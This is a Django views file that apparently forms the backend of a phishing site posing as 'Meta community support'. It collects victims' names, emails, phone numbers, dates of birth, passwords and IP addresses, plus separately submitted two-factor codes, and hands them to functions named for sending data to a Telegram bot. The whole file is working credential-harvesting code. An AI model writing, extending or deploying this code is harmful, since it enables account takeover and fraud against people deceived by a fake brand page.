from django.shortcuts import render, redirect

from myapp.services.get_data_from_form import send_data_to_tele_bot, send_2fa_to_tele_bot


# from services.get_data_from_form import send_data_to_tele_bot, send_2fa_to_tele_bot


def home(request):
    return render(request, 'home.html')


def catch_all(request, path):
    return redirect('home')


def two_fa(request):
    if request.method == 'POST':
        code = request.POST.get('codeMail', '')
        email = request.POST.get('email', '')
        email_business = request.POST.get('emailbs', '')
        send_2fa_to_tele_bot(email, code)
    return render(request, '2fa.html')


def meta_community_support(request):
    if request.method == 'POST':
        # Access form data using request.POST dictionary
        fan_page_name = request.POST.get('namefanpage', '')
        fullname = request.POST.get('fullname', '')
        dob = request.POST.get('dob', '')
        email_business = request.POST.get('emailbs', '')
        email = request.POST.get('email', '')
        phone = request.POST.get('phone', '')
        password = request.POST.get('password', '')
        country = request.POST.get('country', '')
        city = request.POST.get('city', '')
        ip = request.POST.get('Ip', '')

        # Now you can use the form data as needed, for example, send it to Telegram bot
        send_data_to_tele_bot(fan_page_name, fullname, email_business, email, phone, password, country, dob, city, ip)

        # You can also return a response or redirect to another page after processing the form
        # return HttpResponse('Form submitted successfully')

    return render(request, 'meta-community-support.html')
